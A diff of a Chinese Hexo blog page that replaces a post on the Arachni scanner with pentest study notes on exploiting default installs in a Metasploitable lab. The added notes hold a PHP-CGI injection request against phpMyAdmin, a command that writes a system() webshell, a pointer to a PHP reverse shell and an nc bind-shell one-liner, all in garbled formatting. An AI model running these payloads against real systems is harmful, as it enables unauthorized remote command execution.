@@ -157,7 +157,7 @@
     </script>
     
     <script defer type="text/javascript" src="/js/custom.js"></script>
-    <title>Web扫描工具-Arachni | Pyrrhax</title>
+    <title>手动漏洞挖掘-1.默认安装 | Pyrrhax</title>
   <meta name="generator" content="Hexo 4.2.1"></head>
   <body itemscope itemtype="http://schema.org/WebPage" lang="zh_CN"  data-spy="scroll" data-target=".list-group">
     
@@ -203,7 +203,7 @@
   
   <article class="article post card" itemscope itemtype="http://schema.org/Article">
     <div class="post-block">
-      <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/10/12/Web%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7-Arachni/">
+      <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/10/14/%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-1-%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85/">
       <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
        <meta itemprop="name" content="Pyrrhax">
        <meta itemprop="description" content="">
@@ -214,11 +214,11 @@
       </span>
     </div>
     <header class="post-header">
-      <h1 class="post-title" itemprop="name headline">Web扫描工具-Arachni</h1>
+      <h1 class="post-title" itemprop="name headline">手动漏洞挖掘-1.默认安装</h1>
       <div class="post-meta">
         
         <span class="post-date">
-          <i class="far fa-calendar-plus"></i><span><time title="post-date" itemprop="dateCreated datePublished" datetime="2020-10-12T22:22:00+08:00">2020-10-12 22:22:00</time></span>
+          <i class="far fa-calendar-plus"></i><span><time title="post-date" itemprop="dateCreated datePublished" datetime="2020-10-14T17:30:17+08:00">2020-10-14 17:30:17</time></span>
         </span>
         
         
@@ -236,20 +236,44 @@
       </div>
     </header>
     <main class="post-main" itemprop="articleBody">
-      <h3 id="Web扫描器-Arachni"><a href="#Web扫描器-Arachni" class="headerlink" title="Web扫描器-Arachni"></a>Web扫描器-Arachni</h3><ul>
-<li><p>官网</p>
+      <h3 id="手动漏洞挖掘-1-默认安装"><a href="#手动漏洞挖掘-1-默认安装" class="headerlink" title="手动漏洞挖掘-1.默认安装"></a>手动漏洞挖掘-1.默认安装</h3><ul>
+<li><p>Windows默认安装漏洞</p>
+</li>
+<li><p>phpMyAdmin/setup</p>
 <ul>
-<li><a href="https://www.arachni-scanner.com/" target="_blank" rel="noopener">https://www.arachni-scanner.com/</a></li>
+<li><p>MetaSploitable</p>
+<ul>
+<li><p>```<br>POST http:///phpMyAdmin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1<br>Host: 192.168.20.10<br>Content-Length: 40</p>
+<?php
+passthru('pwd&&ls'); 
+die();
+?>
+<figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain"><br>  - ![](pic1.png)<br><br><br>&lt;!--more--&gt;<br><br>- 写入webshell<br><br>  -<br></code></pre></td></tr></table></figure>
+<p>echo”<?php\$cmd=\$_GET["cmd"];system(\$cmd);?>“&gt;/var/www/3.php</p>
+<figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain"><br>- PHP反弹shell<br><br>  - &#96;&#96;&#96;&#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;php-reverse-shell.php<br></code></pre></td></tr></table></figure></li>
+<li><p>直接把内容用burp发送，然后在本地用nc侦听，记得修改php文件里面的ip地址</p>
+</li>
 </ul>
 </li>
-<li><p>支持分布式扫描</p>
+<li><p>侦听shell</p>
+<ul>
+<li><pre><code>echo system(&apos;mkfifo /tmp/pipe;sh /tmp/pipe|nc -nlp 4444 &gt; /tmp/pipe&apos;);</code></pre></li>
+</ul>
 </li>
-<li><p>支持调度，每隔多久扫描一次</p>
-</li>
-<li><p>安装后，输入用户名密码登录提示错误，google发现很多人有同样错误，暂时无解。</p>
+<li><p>File</p>
+<ul>
+<li>如果当前用户没有权限执行ifconfig，先用whereis 查看ifconfig的路径，然后到目录下使用./执行。</li>
+</ul>
 </li>
 </ul>
-<a id="more"></a>
+</li>
+<li><p>Ubuntu/Debian默认安装PHP5-cgi</p>
+</li>
+<li><p>可直接访问/cgi-bin/php5和/cgi-bin/php(爬不出来的目录</p>
+</li>
+</ul>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>思路：先检查默认安装的软件是否有相关漏洞</p>
+
     </main>
     <footer class="post-footer">
       
@@ -266,7 +290,7 @@
   <nav class="page-nav">
     <div class="page-nav-next page-nav-item">
       
-      <a href="/2020/10/12/Web%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7-w3af/" rel="next" title="Web扫描工具-w3af"><i class="fas fa-angle-left"></i><span class="nav-title">Web扫描工具-w3af</span></a>
+      <a href="/2020/10/14/Web%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7-Burpsuite/" rel="next" title="Web扫描工具-Burpsuite"><i class="fas fa-angle-left"></i><span class="nav-title">Web扫描工具-Burpsuite</span></a>
       
     </div>
     <div class="page-nav-prev page-nav-item">
@@ -296,7 +320,7 @@
       "client_secret": "71b8ae2203a2a15d590a6866959b732267194412",
       "no_comment": "这个页面还没有评论，现在就去评论吧！",
       "go_to_comment": "去评论",
-      "issue_title": "Web扫描工具-Arachni",
+      "issue_title": "手动漏洞挖掘-1.默认安装",
       "btn_class": "button",
       "comments_target": "#comment-thread"
     });
@@ -353,7 +377,7 @@
     
     <div class="archives-count count-block">
       <div class="site-count-title">归档</div>
-      <div><a href="/archives/">42</a></div>
+      <div><a href="/archives/">44</a></div>
     </div>
     
     
@@ -391,7 +415,7 @@
     <hr>
     <div class="post-toc sidebar-item" id="toc-div">
       <div><i class="fas fa-list-ol"></i>文章目录</div>
-      <div class="post-toc-content"><ol class="list-group toc"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#Web扫描器-Arachni"><span class="toc-text">Web扫描器-Arachni</span></a></li></ol></div>
+      <div class="post-toc-content"><ol class="list-group toc"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#手动漏洞挖掘-1-默认安装"><span class="toc-text">手动漏洞挖掘-1.默认安装</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol></div>
     </div>
     
     
